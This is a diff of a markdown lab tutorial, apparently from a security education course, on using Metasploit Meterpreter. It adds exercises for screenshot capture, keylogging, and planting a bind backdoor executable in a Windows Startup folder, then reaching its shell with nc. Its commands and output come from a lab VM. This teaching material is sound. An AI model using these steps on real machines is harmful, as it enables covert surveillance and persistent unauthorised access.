@@ -182,6 +182,50 @@ Please a more complete list of Meterpreter commands <a href="https://www.offensi
 - Installing service Persistence and opening a persistent backdoor
   - Need system priviledge since it installs a service. Does not work since Windows 10/11 kills the malicious service automatically.
 
+## Hands-on 1: Hacking into metasploitable 2
+Please check this <a href="../FieldTrips">tutorial</a>.
+
+## Hands-on 2: Capturing sreenshot
+1. The attacker hacks into the target and opens a Meterpreter shell.
+
+2. Use the meterpreter command *screenshot* tom capture a screenshot of the Windows VM.
+
+## Hands-on 3: Capturing sreenshot
+1. The attacker hacks into the target and opens a Meterpreter shell.
+
+2. Use the meterpreter command *keyscan_start*, *keyscan_dump*, and *keyscan_stop* tom capture a screenshot of the Windows VM.
+
+
+## Hands-on 4: Deploying persistent backdoor
+
+1. The attacker hacks into the target and opens a Meterpreter shell.
+
+2. Within the Meterpreter shell, *upload* the backdoor to the startup folder
+
+```
+meterpreter > upload /home/kali/GenCyber/MalwareSamples/Backdoors/SimpleBindBackdoor/nice3.exe C:\\Users\\"Malware Analysis"\\AppData\\Roaming\\Microsoft\\Windows\\"Start Menu"\\Programs\\Startup\\nice3.exe
+[*] uploading  : /home/kali/GenCyber/MalwareSamples/Backdoors/SimpleBindBackdoor/nice3.exe -> C:\Users\Malware Analysis\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\nice3.exe
+[*] Uploaded 49.83 KiB of 49.83 KiB (100.0%): /home/kali/GenCyber/MalwareSamples/Backdoors/SimpleBindBackdoor/nice3.exe -> C:\Users\Malware Analysis\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\nice3.exe
+[*] uploaded   : /home/kali/GenCyber/MalwareSamples/Backdoors/SimpleBindBackdoor/nice3.exe -> C:\Users\Malware Analysis\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\nice3.exe
+```
+Please pay attention to how the long folder name with multiple words is quoted.
+
+To find where the startup folder is, press the Windows logo key  + R, type *shell:startup*, then select OK. This opens the Startup folder so that you can see where it is.
+
+3. Restart Windows VM. Use *nc* at Kali VM to log into the backdoor
+```
+┌──(kali㉿Cyber-Range)-[~]
+└─$ nc 192.168.1.19 8080    
+Microsoft Windows [Version 10.0.19044.1706]
+(c) Microsoft Corporation. All rights reserved.
+
+C:\Windows\system32>
+```
+
+# References
+- v4L, <a href="https://www.hacking-tutorial.com/tips-and-trick/13-metasploit-meterpreter-file-system-command-you-should-know/#sthash.R7VFJW1l.dpbs">13 Metasploit Meterpreter File System Command You Should Know</a>
+- <a href="https://www.offensive-security.com/metasploit-unleashed/meterpreter-basics/">METERPRETER BASIC COMMANDS</a>
+
 <!---
 so you can see now once you
 set up a paper team everything will just kind of go in from the beginning again
@@ -613,33 +657,3 @@ so convenient i don't know what the commands is for which one but what the purpo
 and uh so i don't have the bigger kind of a picture of what is going on over there so
 i think it is good to teach beginners before
 -->
-
-## Hands-on: Deploying persistent backdoor
-
-1. The attacker hacks into the target and opens a Meterpreter shell.
-
-2. Within the Meterpreter shell, *upload* the backdoor to the startup folder
-
-```
-meterpreter > upload /home/kali/GenCyber/MalwareSamples/Backdoors/SimpleBindBackdoor/nice3.exe C:\\Users\\"Malware Analysis"\\AppData\\Roaming\\Microsoft\\Windows\\"Start Menu"\\Programs\\Startup\\nice3.exe
-[*] uploading  : /home/kali/GenCyber/MalwareSamples/Backdoors/SimpleBindBackdoor/nice3.exe -> C:\Users\Malware Analysis\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\nice3.exe
-[*] Uploaded 49.83 KiB of 49.83 KiB (100.0%): /home/kali/GenCyber/MalwareSamples/Backdoors/SimpleBindBackdoor/nice3.exe -> C:\Users\Malware Analysis\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\nice3.exe
-[*] uploaded   : /home/kali/GenCyber/MalwareSamples/Backdoors/SimpleBindBackdoor/nice3.exe -> C:\Users\Malware Analysis\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\nice3.exe
-```
-Please pay attention to how the long folder name with multiple words is quoted.
-
-To find where the startup folder is, press the Windows logo key  + R, type *shell:startup*, then select OK. This opens the Startup folder so that you can see where it is.
-
-3. Restart Windows VM. Use *nc* at Kali VM to log into the backdoor
-```
-┌──(kali㉿Cyber-Range)-[~]
-└─$ nc 192.168.1.19 8080    
-Microsoft Windows [Version 10.0.19044.1706]
-(c) Microsoft Corporation. All rights reserved.
-
-C:\Windows\system32>
-```
-
-# References
-- v4L, <a href="https://www.hacking-tutorial.com/tips-and-trick/13-metasploit-meterpreter-file-system-command-you-should-know/#sthash.R7VFJW1l.dpbs">13 Metasploit Meterpreter File System Command You Should Know</a>
-- <a href="https://www.offensive-security.com/metasploit-unleashed/meterpreter-basics/">METERPRETER BASIC COMMANDS</a>
